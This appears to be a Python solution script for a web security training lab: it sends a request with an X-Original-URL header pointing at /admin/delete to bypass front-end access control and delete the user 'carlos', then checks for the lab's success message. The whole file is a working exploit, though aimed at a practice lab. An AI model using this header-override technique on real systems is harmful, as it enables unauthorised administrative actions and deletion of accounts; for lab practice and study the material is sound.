import argparse
import requests
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set the proxies
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def delete_user(session, url):
    # Set the URL to delete the user
    delete_user_url = f"{url}/?username=carlos"
    # Set the headers for the delete request
    headers = {
        "X-Original-URL": "/admin/delete"
    }
    # Send the delete request
    response = session.get(delete_user_url, headers=headers, verify=False, proxies=proxies)
    # Send a request to the main page to check if the lab was solved
    response = session.get(url, verify=False, proxies=proxies)

    # Check if the lab was solved
    if "Congratulations, you solved the lab" in response.text:
        print("[+] Lab solved")
    else:
        print("[+] Lab not solved and user not deleted")


def main():
    # Create the argument parser
    parser = argparse.ArgumentParser(description='Script to process a URL')
    # Add the URL argument
    parser.add_argument('url', type=str, help='Target URL to process')
    # Parse the arguments
    args = parser.parse_args()
    # Check if the URL argument was supplied
    if not args.url:
        parser.print_usage()
        print('Please supply a URL argument.')
        return
    # Get the target URL from the arguments
    target_url = args.url

    # Print the target URL
    print(f'The URL to process is: {target_url}')

    # Create a new session and delete the user
    session = requests.Session()
    delete_user(session, target_url)


if __name__ == "__main__":
    main()
